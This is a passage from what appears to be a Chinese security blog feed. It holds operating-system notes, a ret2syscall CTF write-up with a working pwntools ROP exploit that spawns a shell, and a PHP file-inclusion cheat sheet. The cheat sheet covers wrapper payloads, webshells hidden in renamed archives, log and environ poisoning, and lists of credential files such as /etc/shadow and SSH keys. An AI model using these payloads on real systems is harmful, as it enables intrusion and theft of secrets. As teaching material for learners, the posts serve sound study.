class="headerlink" title="分页"></a>分页</h3><p>首先贴出分页的范例示意图：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E5%88%86%E9%A1%B5.png" alt></p><p>我们首先规定一些概念：</p><ul><li>虚拟空间的页叫做”<strong>虚拟页</strong>“（Virtual Page，简称VP）</li><li>物理内存的页叫做”<strong>物理页</strong>“ （Physical Page，简称PP）</li><li>磁盘中的页叫做”<strong>磁盘页</strong>“ （Disk Page，简称DP）</li></ul><p>然后我们对上图进行分析：</p><p>进程1中的虚拟页VP0、VP1和VP7映射到了物理页PP0、PP2和PP3上面；然后进程1中有部分虚拟页位于磁盘页中，即VP2、VP3分别位于磁盘中的DP0和DP1；进程1中剩下的虚拟页VP4-VP6可能因为还没调用或者被访问到，处于未访问的状态。</p><p>VP2、VP3没有位于物理内存中，当进程需要调用到VP2和VP3的时候，硬件就会捕捉到这个消息 ：”页错误”。然后<strong>操作系统就会接管进程</strong>负责从磁盘中将VP2和VP3读入到内存中，然后再将内存中的这两个PP和虚拟页中的VP2、VP3<strong>建立映射关系</strong>。</p><p>这样分页就达成了提高效率的目的</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程的简单定义是：<strong>轻量级进程</strong>，线程是程序执行流程的最小单元。</p><p>线程具有三种基本状态：就绪 、运行 、等待</p><p>今天先写到这里吧。。。后面继续补上</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;程序员的自我修养-Day1&quot;&gt;&lt;a href=&quot;#程序员的自我修养-Day1&quot; class=&quot;headerlink&quot; title=&quot;程序员的自我修养 Day1&quot;&gt;&lt;/a&gt;程序员的自我修养 Day1&lt;/h1&gt;&lt;p&gt;静下心来好好研究计算机底层的实现，为二进制安全的研究
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2syscall</title>
    <link href="http://bai-ren-1.github.io/2019/12/06/ret2syscall/"/>
    <id>http://bai-ren-1.github.io/2019/12/06/ret2syscall/</id>
    <published>2019-12-06T08:23:27.000Z</published>
    <updated>2019-12-07T04:31:35.024Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret2syscall 的总结</p><p>先附上有点模糊了的知识：</p><p>1、x86下 ip 调用指令的过程：</p><blockquote><p>1、从 cs:ip 指向的内存单元读取指令，读取指令进入缓冲寄存器；</p><p>2、ip += 所读指令的长度，从而指向下一条指令；</p><p>3、执行指令，然后返回第一步</p></blockquote><p>2、入栈 push 操作的本质：（pop就是反过来）</p><blockquote><p>1、esp 寄存器中的内容减2，使得 ss:sp 指向新的栈顶单元</p><p>2、将数据传入这个新的栈顶单元</p></blockquote><p>3、call 和 ret 的原理</p><blockquote><p>1、call： 先push ip（当前指令的下一条指令的地址压入栈）然后 jmp near ptr 标号</p><p>2、ret ：pop ip （栈顶出栈给 ip，让ip继续执行之前指令后面的指令） </p></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2syscall，即控制程序执行系统调用，获取shell。</p><p>贴上wiki上面关于syscall的解释：</p><blockquote><p><strong>系统调用（system call）</strong>，指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态运行。如设备IO操作或者进程间通信</p><p><strong>用户空间（用户态）和内核空间（内核态）</strong>：操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限。其中系统调用运行在内核空间。</p></blockquote><p><img src="/2019/12/06/ret2syscall/syscall.png" alt></p><p>那我们得知道一个应用程序可以如何调用系统调用，才能利用系统调用里面的系统函数（用Linux进行说明），应用程序调用系统调用的过程是：</p><blockquote><ol><li>把系统调用的编号存入 EAX；</li><li>把函数参数存入其它通用寄存器；</li><li>触发 0x80 号中断（int 0x80）；</li></ol></blockquote><p>同时附上操作系统实现系统调用的过程：</p><blockquote><ol><li>应用程序调用库函数（API）；</li><li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li><li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li><li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li><li>中断处理函数返回到 API 中；</li><li>API 将 EAX 返回给应用程序。</li></ol></blockquote><p>现在知道了通过 int 80h 我们就能在程序中调用系统调用，这里附上 Linux 系统调用表：</p><table><thead><tr><th>%eax</th><th>系统调用名</th><th>源代码</th><th>%ebx</th><th>%ecx</th><th>%edx</th><th>%esx</th><th>通过堆栈</th></tr></thead><tbody><tr><td>1</td><td>sys_exit</td><td><a href="file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>2</td><td>sys_fork</td><td><a href="file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>3</td><td>sys_read</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td>char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td></tr><tr><td>4</td><td>sys_write</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td></tr><tr><td>5</td><td>sys_open</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>int</td><td>int</td><td>-</td><td>-</td></tr><tr><td>6</td><td>sys_close</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>7</td><td>sys_waitpid</td><td><a href="file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td><td>pid_t</td><td>unsigned int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td>8</td><td>sys_creat</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>9</td><td>sys_link</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>const char *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>10</td><td>sys_unlink</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>11</td><td>sys_execve</td><td><a href="file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>12</td><td>sys_chdir</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>13</td><td>sys_time</td><td><a href="file:///usr/src/linux/kernel/time.c">kernel/time.c</a></td><td>int *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>14</td><td>sys_mknod</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>int</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#dev_t" target="_blank" rel="noopener">dev_t</a></td><td>-</td><td>-</td></tr><tr><td>15</td><td>sys_chmod</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#mode_t" target="_blank" rel="noopener">mode_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>16</td><td>sys_lchown</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td>-</td><td>-</td></tr><tr><td>18</td><td>sys_stat</td><td><a href="file:///usr/src/linux/fs/stat.c">fs/stat.c</a></td><td>char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#__old_kernel_stat" target="_blank" rel="noopener">struct __old_kernel_stat *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>19</td><td>sys_lseek</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#off_t" target="_blank" rel="noopener">off_t</a></td><td>unsigned int</td><td>-</td><td>-</td></tr><tr><td>20</td><td>sys_getpid</td><td><a href="file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr></tbody></table><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>使用 ctf-wiki 上面的 ret2syscall（在我本地的文件名为 pwn） ，基本信息就直接说了。下面是 main 的代码，还是 gets 栈溢出然后控制程序执行。通过 cyclic 可以得到栈溢出到返回地址的偏移地址是112；然后程序是32位，开启了NX保护：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们在原程序里面是找不到系统命令直接可以 ret 的，于是我们得使用到syscall。</p><p>在这里我们决定构成下面这个系统调用： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">'/bin/sh'</span>);</span><br></pre></td></tr></table></figure><p>对照表，我们能看到要控制的寄存器是 eax 和ebx  ，那么就可以开始操作了。</p><p>首先我们用 ROPgadget 看一下我们能是用到的 gadgets，首先看 eax , 命令如图所示：</p><p><img src="/2019/12/06/ret2syscall/ret2syscall-1.png" alt></p><p>里面第二个地址的 gadget 干脆利落只控制 eax，直接存起来。我们还得继续寻找 ebx 和  int 0x80 和 /bin/sh 的 rop 链。</p><p>然后我们继续寻找 ebx :</p><p><img src="/2019/12/06/ret2syscall/syscall-2.png" alt></p><p>可以迅速观察到里面的 0x0806eb90 这个地址直接操作了 ebx 、ecx 和 edx ，完美的选择，存下来。</p><p>那么剩下来的就只有找到字符串  /bin/sh 和 int 0x80 的位置了：</p><p><img src="/2019/12/06/ret2syscall/syscall-3.png" alt></p><p>找到 /bin/sh 的位置，继续找 int 0x80 ：</p><p><img src="/2019/12/06/ret2syscall/syscall-4.png" alt></p><p>要素都集齐了，下面开始了 rop 之旅，附上自己的 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">112</span></span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"?"</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>下面用详细大白话解释exp：</p><blockquote><p>112个 a 控制溢出到返回地址，我们设置返回地址为 pop_eax 操作的地址。当 ip 运行到这个地址返回时，就会跳去执行 pop eax 的操作了；同时 esp 在读完这个返回地址后继续往下，指向 0xb 这个数据单元。在 ip 读完 pop eax 指令，就会把当前栈顶的值赋值给 eax，也就是把 0xb 赋值给 eax ，那么我们的第一步目的就达成了。</p><p>然后在栈弹给值 0xb 给 eax 后，栈指针继续往下走指向了 ebx 那一串 pop 指令所在地址，同时ip 会继续走到了执行 ret 的那条指令的位置（ pop eax 后的 ret 操作）。 ret 本质（模糊知识点起作用了）就是把当前栈指向的地址（也就是 ebx 的那一串 pop 指令的地址）返回给 ip 。然后 ip 就会傻傻的跑去执行那一串 pop 操作了，esp也傻傻的继续往下走（指向了payload中的第一个0） 。</p><p>那一串 pop 操作顺序是 pop edx；pop ecx；pop ebx；ret  ，一步一步对应就会是 ：弹出栈顶给 edx（edx被赋值为0）-&gt;  esp继续走（esp指向了第二个0）然后 ip 也继续走去执行 pop ecx  -&gt;  弹出栈顶给 ecx（ecx被赋值为0），然后 ip 也继续走去执行 pop ebx  -&gt; esp继续走 -&gt; 弹出栈顶给 ebx （ ebx 被赋值了 /bin/sh） -&gt; esp继续往下走（指向了 int 0x80）-&gt; ret（弹出栈顶 int 0x80 的值给 ip ，ip跑去执行 int 0x 80h 进入中断）。</p></blockquote><p>至此 rop 链构建成功，成功getshell。</p><p><img src="/2019/12/06/ret2syscall/shell.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>系统调用好用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ret2syscall&quot;&gt;&lt;a href=&quot;#ret2syscall&quot; class=&quot;headerlink&quot; title=&quot;ret2syscall&quot;&gt;&lt;/a&gt;ret2syscall&lt;/h1&gt;&lt;p&gt;大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="http://bai-ren-1.github.io/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://bai-ren-1.github.io/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2019-11-30T12:49:42.000Z</published>
    <updated>2019-12-05T12:02:23.132Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>看了一天的二进制，先暂时不继续了。写一写关于文件包含的姿势，下面说的较多是能 getshell 的技巧，只包含出敏感文件这里就不多说了</p><p> PHP的<strong>文件包含</strong>可以直接执行被包含文件的代码，包含的文件格式是不受限制的，只要正常执行即可 ，一般来说php使用的文件包含函数有四个：include、include_once、require、require_once</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>类型的包含文件时即使遇到错误，下面代码会依然执行</span><br><span class="line"><span class="keyword">include</span>()：</span><br><span class="line"><span class="keyword">include_once</span>()：先验证是否已经包含了文件，如果已经包含了，就不再执行</span><br><span class="line">    </span><br><span class="line"><span class="keyword">require</span>类型的包含文件时遇到错误直接退出</span><br><span class="line"><span class="keyword">require</span>()：</span><br><span class="line"><span class="keyword">require_once</span>()：先验证是否已经包含了文件，如果已经包含了，就不再执行</span><br></pre></td></tr></table></figure><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><ul><li><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p><blockquote><p>allow_url_include = On;</p><p>allow_url_fopen 无要求;</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">POST：</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><hr><ul><li><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：</p><blockquote><p>无要求；</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure></li></ul><hr><ul><li><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p><blockquote><p>php版本 &gt;= 5.3.0</p></blockquote></li></ul><p>  范例：</p><p>  场景一：文件限定支持上传 zip 等压缩包格式并且不支持php上传，并且含有文件包含漏洞。我们可以先写<code>&lt;?php phpinfo(); ?&gt;</code> 的读取 phpinfo 的 txt (这里也可以直接写一句话木马 shabi.php )。然后添加到压缩包 test.zip 里面并且成功上传，然后通过 phar 就能读出压缩包里面的txt文件并且使其能被执行：</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指定绝对路径：</span><br><span class="line">index.php?file=phar:<span class="comment">//E:/phpStudy/WWW/test.zip/phpinfo.txt</span></span><br><span class="line"></span><br><span class="line">指定相对路径（下面这样是压缩文件和index.php在同一目录）：</span><br><span class="line">index.php?file=phar:<span class="comment">//test.zip/phpinfo.txt</span></span><br></pre></td></tr></table></figure><p>  场景二：文件限定支持上传 jpg 等图片格式并且不支持php上传，并且含有文件包含漏洞。我们可以先写一句话木马 shabi.php ，然后添加到压缩包 test.zip 里面，并且将 test.zip 改名为 test.jpg ，这样就能成功上传并且能通过 phar 读出压缩包里面的一句话木马并且执行：‘</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指定绝对路径：</span><br><span class="line">index.php?file=phar:<span class="comment">//E:/phpStudy/WWW/test.jpg/shabi.php</span></span><br><span class="line"></span><br><span class="line">指定相对路径（下面这样是压缩文件和index.php在同一目录）：</span><br><span class="line">index.php?file=phar:<span class="comment">//test.jpg/shabi.php</span></span><br></pre></td></tr></table></figure><hr><ul><li><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件</p><blockquote><p>php版本 &gt;= 5.3.0</p><p>需要指定绝对路径</p><p>构造压缩包的方法等同于phar</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip:<span class="comment">//E:/phpStudy/WWW/test.zip%23phpinfo.txt</span></span><br></pre></td></tr></table></figure><blockquote><p>这里的 %23 是 # 的url编码</p></blockquote></li></ul><hr><ul><li><h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>利用条件</p><blockquote><p>php版本大于等于php5.2</p><p>allow_url_fopen = On</p><p>allow_url_include = On</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">接收文本执行命令：</span><br><span class="line">index.php?file=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'whoami'</span>);<span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">接收base64编码文件执行命令:</span><br><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%<span class="number">2</span>b </span><br><span class="line"></span><br><span class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><br></pre></td></tr></table></figure><blockquote><p>%2b 是 + 的url编码，解码后PD9waHAgcGhwaW5mbygpOz8+这串base64串解码后是</p><p> <code>&lt;?php phpinfo();  ?&gt;</code></p><p>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg== 这串base64串解码后是</p><p><code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p></blockquote></li></ul><hr><h2 id="日志包含getshell"><a href="#日志包含getshell" class="headerlink" title="日志包含getshell"></a>日志包含getshell</h2><p>当存在文件包含漏洞的时候，我们往往可以通过污染日志并且包含来getshell。</p><p>污染日志的原理就是通过访问一个错误的请求让日志记录下这条记录，我们在访问错误记录时使用代码进行请求，然后再通过文件包含包含出来，就能达到执行的目的了：</p><p><img src="/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E4%BE%8B%E5%AD%90.png" alt></p><p>标上红标的地方改为一句话木马，然后包含出来就能getshell了。</p><blockquote><p>因为浏览器的编码问题，污染日志的一句话可能被自动加上url编码导致包含时会失效。</p><p>解决方法：1、用bp改回参数；2、用curl命令发请求</p></blockquote><p>附上各种能污染的WEB日志的路径：</p><h3 id="Apache日志："><a href="#Apache日志：" class="headerlink" title="Apache日志："></a>Apache日志：</h3><p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，error.log的默认路径是在在</p><ul><li>/var/log/apache2/error.log</li></ul><p>下面是其他一般日志的路径</p><ul><li>/var/log/apache/access_log</li><li>/var/www/logs/access_log</li><li>/var/log/access_log</li><li>/var/log/apache2/access.log </li></ul><hr><h3 id="SSH日志："><a href="#SSH日志：" class="headerlink" title="SSH日志："></a>SSH日志：</h3><p>需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">'&lt;?php phpinfo(); ?&gt;'</span>@remotehost</span><br></pre></td></tr></table></figure><p>然后提示密码输入，随意输入就会登录失败。</p><p>之后在 remotehost 的 ssh-log 中就会出现刚刚登录的php代码，对 ssh-log包含即可执行。</p><hr><h2 id="environ包含getshell"><a href="#environ包含getshell" class="headerlink" title="environ包含getshell"></a>environ包含getshell</h2><p>利用条件：</p><blockquote><p>php以cgi方式运行，这样environ才会保持UA头。</p><p>environ文件存储位置已知，且environ文件可读。</p></blockquote><p>/proc/self/environ： Linux下的当前正在运行的进程的环境变量列表 ，访问能看到里面会有http请求头的信息。于是我们可以通过 user-agent变量进行代码注入，然后通过文件包含来读取并执行代码。</p><p>范例：</p><p><img src="/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/user-agent%E6%B3%A8%E5%85%A5.png" alt></p><blockquote><p>上面例子是反弹了一个shell，我们也可以注普通的一句话</p></blockquote><hr><h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p>session 文件格式为 sess_[phpsessid] , phpsessid 作为cookie传递，在服务端文件位置会变化</p><p>默认路径是：</p><ul><li>/tmp/(PHP Sessions)</li></ul><p>也可能位于下面路径：</p><ul><li>/var/lib/php/session/(PHP Sessions)</li><li>/var/lib/php5/(PHP Sessions)</li><li>c:/windows/temp/(PHP Sessions)等文件中</li></ul><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇因为期末写了好多天，哎，长路漫漫，漫漫奋斗</p><p>附上敏感文件：</p><p>Linux下：</p><p> ssh免密码登录的秘钥文件等 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized_keys </span><br><span class="line">/root/.ssh/id_rsa </span><br><span class="line">/root/.ssh/id_rsa.keystore </span><br><span class="line">/root/.ssh/id_rsa.pub </span><br><span class="line">/root/.ssh/known_hosts</span><br></pre></td></tr></table></figure><p>加密后的用户口令位置 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/shadow 历史命令 </span><br><span class="line">/root/.bash_history /root/.mysql_history</span><br></pre></td></tr></table></figure><p>进程文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/fd/fd[0-9]* (文件标识符)</span><br></pre></td></tr></table></figure><p>检查已经被系统挂载的设备 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/mounts</span><br></pre></td></tr></table></figure><p>机器的内核配置文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/config.gz</span><br></pre></td></tr></table></figure><p>window下 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:/boot.ini  //查看系统版本  </span><br><span class="line">C:/Windows/System32/inetsrv/MetaBase.xml  //IIS配置文件  </span><br><span class="line">C:/Windows/repairsam  //存储系统初次安装的密码  </span><br><span class="line">C:/Program Files/mysqlmy.ini  //Mysql配置  </span><br><span class="line">C:/Program Files/mysql/data/mysqluser.MYD  //Mysql root  </span><br><span class="line">C:/Windows/php.ini  //php配置信息  </span><br><span class="line">C:/Windows/my.ini  //Mysql配置信息</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a&gt;文件包含&lt;/h1&gt;&lt;p&gt;看了一天的二进制，先暂时不继续了。写一写关于文件包含的姿势，下面说的较多是能 getshell 的技巧，只包含出敏感文件这里
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>系统栈和经典栈溢出</title>
    <link href="http://bai-ren-1.github.io/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://bai-ren-1.github.io/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/</id>
    <published>2019-11-30T04:39:05.000Z</published>
    <updated>2019-11-30T08:59:30.274Z</updated>
    
